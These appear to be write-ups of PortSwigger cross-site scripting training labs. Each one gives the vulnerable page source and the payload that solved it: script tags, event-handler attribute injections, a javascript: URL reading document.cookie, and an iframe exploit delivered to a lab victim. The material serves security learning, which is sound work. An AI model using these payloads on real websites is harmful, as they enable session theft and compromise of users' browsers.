# Cross-site scripting (XSS)

See detatail at [here](https://portswigger.net/web-security/cross-site-scripting)

Cheatsheet at [here](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

Type of XSS attack in example:
 - [Reflected XSS](#reflected-xss)
 - [Stored XSS](#stored-xss)
 - [DOM-based XSS](#dom-based-xss)

## Reflected XSS

Get deteail at [here](https://portswigger.net/web-security/cross-site-scripting/reflected)

[Lab 1](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)

Description of this lab: perform a cross-site scripting attack that calls the alert function

Typing `<script>alert()</script>` into search bar to call alert function, then solved the lab.

[Lab 7](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)

Description of this lab: vulnerability in the search blog, injects an attribute and calls the alert function.

Try to find somthing with search bar, and check source code, we can found `<input type="text" placeholder="Search the blog..." name="search" value="test">`. Check at [here](https://portswigger.net/support/exploiting-xss-injecting-into-tag-attributes), we will use `" onload="alert()` but it was not worked because this tag is can not be loaded, so replace it to `onmouseover`. The final payload is `" onmouseover="alert()`, then drag mouse to search bar and solved the lab.

[Lab 9](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)

Description of this lab: To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function in the search query tracking functionality.

Try to type something into search bar, and check the code

````html
    <script>
        var searchTerms = 'test';
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');             
    </script>

    <img src="/resources/images/tracker.gif?searchTerms=test">
    
````

Exploit function `encodeURIComponent` with this [post](https://security.stackexchange.com/questions/66252/encodeuricomponent-in-a-unquoted-html-attribute). Unquoted attributes can be broken out of with many characters, including `[space] % * + , - / ; < = > ^ and |`. The final payload `'/alert()/'`.

## Stored XSS

Get detail at [here](https://portswigger.net/web-security/cross-site-scripting/stored)

[Lab 2](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)

Description of this lab: submit a comment that calls the alert function when the blog post is viewed.

Type `<script>alert()</script>` into content of comment box at any post, then solved the lab.

[Lab 8](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)

Description of this lab: To solve this lab, submit a comment that calls the alert function when the comment author name is clicked (when user have own website).

We can use same technique of **lab 5**. Post a comment with `javascript:alert()` in website field, then solve the lab.

## DOM-based XSS

Get detail at [here](https://portswigger.net/web-security/cross-site-scripting/dom-based)

[Lab 3](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)

Description of this lab: perform a cross-site scripting attack that calls the alert function using document.write

Check how website work, look at the source:
```js
    <script>
        function trackSearch(query) {
            document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
        }
        var query = (new URLSearchParams(window.location.search)).get('search');
        if(query) {
            trackSearch(query);
        }
    </script>
```

We use document.write to insert plain HTML into the DOM (which opens the door for DOM XSS attacks). Moreover, if query is successful, website will load svg image. Type `"><svg onload=alert()>` (it will be triggered when svg load) into search bar, then solved the lab.

[Lab 4](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)

This lab has the same description as the previous one but using innerHTML

Check how website work, look at the source:
```js
    
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
                        
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        doSearchQuery(query);
    }
                        
```

Try to find cheatsheet with keyword `innerHTML` and found this:
```js
    '<img/src/onerror=alert(1)>';</script>
```
The mechanic of this payload like this: here is sample js 
```js
    <script>
    ...
    </script>
```

After we insert payload, it become:
```js
    <script>
        '<img/src/onerror=alert(1)>';
        </script> /*this is the end of script and script will be triggered when img load error*/
    </script>

```

Type this one into search bar and solved the lab.

[Lab 5](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)

Description of this lab: make the "back" link alert document.cookie using anchor href attribute

In this lab, website includes submit feedback, when try to submit form, url was change like this `example.com/feedback?returnPath=/post`, it seems to "back" to previous post. We can found the source of this:
```js
    $(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
                        
```

Check the cheatsheet, the final payload is `/feedback?returnPath=javascript:alert(document.cookie)`

[Lab 6](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)

Description of this lab: deliver an exploit to the victim that calls the print() function in their browser.

In this lab, we got exploit server, using this for sending exploit to victim. Finding in cheatsheet with keyword `print()`, we can found `<img src=x onerror=print()>` (meaning: trigger when load error). However, in this exploit server, there is no place for victim's url, so we need to modify payload, we can mix with `iframe` and `onload`. The final payload `<iframe src="example.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`, send it to victim and solved the lab.

[Lab 10](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)

Description of this lab: perform a cross-site scripting attack that breaks out of the select element and calls the alert function in the stock checker functionality.

Open detail of any product, at the end of the page, it has `Check stock`. When user click button, website will check available stocks in specific location. Check the code

```html
    <script>
        var stores = ["London","Paris","Milan"];
        var store = (new URLSearchParams(window.location.search)).get('storeId');

        document.write('<select name="storeId">');
        if(store) {
            document.write('<option selected>'+store+'</option>');
        }

        for(var i=0;i<stores.length;i++) {
            if(stores[i] === store) {
                continue;
            }
            document.write('<option>'+stores[i]+'</option>');
        }
        document.write('</select>');
    </script>
```

Moreover, we can modify url parameter to send value of storeId to server and we can exploit variable `store`. The final payload `product?productId=1&storeId="></select><img src=1 onerror=alert()>` and the lab will be solved.

The code after use payload
```html
    ...
    <select name="storeId"> ... </select>
    <img src="1" onerror="alert()"> /* this code is injected into source */
    <option>London</option>
    ...
```






